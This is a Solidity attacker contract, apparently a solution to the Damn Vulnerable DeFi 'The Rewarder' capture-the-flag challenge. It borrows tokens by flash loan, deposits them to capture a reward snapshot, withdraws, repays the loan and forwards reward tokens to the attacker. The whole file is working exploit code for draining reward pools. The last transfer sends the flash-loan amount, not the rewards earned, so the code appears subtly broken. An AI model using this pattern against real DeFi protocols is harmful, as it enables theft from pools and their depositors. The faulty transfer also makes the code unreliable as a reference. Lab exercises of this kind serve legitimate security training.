// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

import {Address} from "openzeppelin-contracts/utils/Address.sol";
import {RewardToken} from "./RewardToken.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";
import {AccountingToken} from "./AccountingToken.sol";

interface IFlashLoanReceiver {
    function receiveFlashLoan(uint256 amount) external;

    error SenderIsNotFlashLoanerPool();

    error SenderIsNotOwner();
}

interface ITheRewarderPool {
    function deposit(uint256 amountToDeposit) external;

    function distributeRewards() external returns (uint256);

    function withdraw(uint256 amountToWithdraw) external;
}

contract FlashLoanReceiver {
    using Address for address;

    address private _attacker;
    address private _flashLoanerPool;
    address private _rewarderPool;
    address private _dvt;
    address private _rewardToken;
    address private _accToken;

    error SenderIsNotFlashLoanerPool();
    error SenderIsNotOwner();

    constructor(
        address attacker,
        address flashLoanerPool,
        address rewarderPool,
        address dvtAddress,
        address rewardTokenAddress,
        address accTokenAddress
    ) {
        _attacker = attacker;
        _flashLoanerPool = flashLoanerPool;
        _rewarderPool = rewarderPool;
        _dvt = dvtAddress;
        _rewardToken = rewardTokenAddress;
        _accToken = accTokenAddress;
    }

    function attack(uint256 amount) external {
        if (msg.sender != _attacker) revert SenderIsNotOwner();
        _flashLoanerPool.functionCall(
            abi.encodeWithSignature("flashLoan(uint256)", amount)
        );
    }

    function receiveFlashLoan(uint256 amount) external {
        if (msg.sender != _flashLoanerPool) revert SenderIsNotFlashLoanerPool();
        _rewarderPool.functionCall(
            abi.encodeWithSignature("deposit(uint256)", amount)
        );
        _rewarderPool.functionCall(
            abi.encodeWithSignature("distributeRewards()")
        );
        _rewarderPool.functionCall(
            abi.encodeWithSignature("withdraw(uint256)", amount)
        );
        _dvt.functionCall(
            abi.encodeWithSignature(
                "transfer(address,uint256)",
                _flashLoanerPool,
                amount
            )
        );
        _rewardToken.functionCall(
            abi.encodeWithSignature(
                "transfer(address,uint256)",
                _attacker,
                amount
            )
        );
    }
}
